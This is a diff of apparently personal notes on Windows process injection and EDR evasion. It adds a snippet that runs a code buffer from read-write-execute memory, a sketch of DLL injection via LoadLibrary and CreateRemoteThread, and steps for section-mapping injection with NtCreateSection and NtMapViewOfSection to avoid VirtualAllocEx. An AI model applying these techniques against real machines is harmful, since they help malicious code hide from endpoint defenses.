@@ -59,6 +59,27 @@ GetProcAddress(GetModuleHandleA("kernelbase"), "CreateFile2");
 
 
 
+```cpp
+    execMem = VirtualAlloc(NULL, sizeof(code), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(execMem, code, sizeof(code));
+    f = (Func)execMem;
+    f(&hPipe);
+```
+
+without virtualalloc
+
+find writeable memory, put loadlibrary , pass dll as argument and call CreateRemoteThread
+
+
+```
+typedef HANDLE (WINAPI *CREATEFILE2)(LPCWSTR, DWORD, DWORD, DWORD, LPCREATEFILE2_EXTENDED_PARAMETERS);
+
+GetProcAddress(GetModuleHandleA("kernelbase"), "CreateFile2");
+```
+
+
+
+
 ```
 typedef NTSTATUS (NTAPI *NtCreateFile_t)(
     PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
@@ -68,12 +89,30 @@ GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateFile");
 ```
 
 
-```cpp
-    execMem = VirtualAlloc(NULL, sizeof(code), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    memcpy(execMem, code, sizeof(code));
-    f = (Func)execMem;
-    f(&hPipe);
+
+
 ```
+avoiding virtual alloc 
+
+Instead of allocating memory directly in a remote process using VirtualAllocEx, you:
+
+- Create a memory section (like a shared memory region).
+
+- Map that section into both your process and the target process.
+
+- Write your payload into your local mapping.
+
+- The payload now exists in the remote process too — because both share the same memory section.
+
+This approach uses native NT APIs:
+
+NtCreateSection
+
+NtMapViewOfSection
+
+```
+
+
 ## Bypassing EDR API Hooking 
 
 ### inject inline asm with naked function
